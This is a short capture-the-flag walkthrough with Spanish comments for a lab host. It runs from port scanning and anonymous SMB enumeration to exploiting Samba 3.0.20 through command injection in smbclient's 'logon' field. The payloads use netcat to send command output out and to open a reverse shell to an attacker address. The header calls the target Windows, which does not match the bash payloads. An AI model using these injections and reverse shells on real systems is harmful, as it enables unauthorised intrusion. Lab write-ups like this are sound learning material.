## Summary

Tags: #Windows #SMB #nohup

- IP -> 10.10.10.3
- Ports -> TCP (21, 22, 139, 445, 3632), UDP (idk)
- OS ->  Windows 
- Services & Applications


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

FTP
```bash 
❯ nmap --script ftp-anon -p21 ❮Target IP❯            # ftp-enum = Escanea y mira si el usuario invitado 'Anonymous' esta habilitado
```

```bash 
❯ searchsploit vsftpd 2.3.4                       # Para ver si hay vulnerabilidades con la version proporcionada

❯ searchsploit samba 3.0.20                       # Para ver si hay vulnerabilidades con la version proporcionada y encontramos uno de Metasploit, por lo que procedemos a examinar el codigo. Enocntramos que emplean un 'nohup' en la sesion
```

Samba
```bash 
❯ smbclient -L ❮IP❯ -N                      # Para hacer la consulta con la sesion 'NULL'
❯ smbclient -L ❮IP❯ -N --option 'client min protocol = NT1'   # Para evitar el error que nos marca y asi listar los recursos compartidos de la red 
❯ smbclient //❮IP❯/tmp -N --option 'client min protocol = NT1' # Conectarse al recurso compartido 
```

## User

Para poder hacer este proceso, debemos de estar conectados al recurso SMB
```bash 
smb❯ logon "/=`nohup ping -c 1 10.10.14.3`"                # Usaremos este comando para enviarnos un ping y ver si tenemos ejecucion remota de comandos  

❯ tcpdump -i tun0 icmp -n                                  # Para capturar el paquete anterior 
```

```bash
smb❯ logon "/=`nohup whoami | nc 10.10.14.3`"              # Usaremos este comando para enviarnos la respuesta a nuestra IP por Netcat 

❯ nc -nlvp 443
```

```bash 
smb❯ logon "/=`nohup nc -e /bin/bash 10.10.14.3 443`"       # Usaremos este comando para enviarnos una Revershell por Netcat

❯ nc -nlvp 443
```


## Root

```bash 
# Tratamiento a la terminal 

❯ script /dev/null -c bash 
❯ Ctrl + z
	❯ stty raw -echo; fg
	❯ reset xterm

# Mejorar las proporciones de la terminal 
❯ stty rows 44 columns 184
```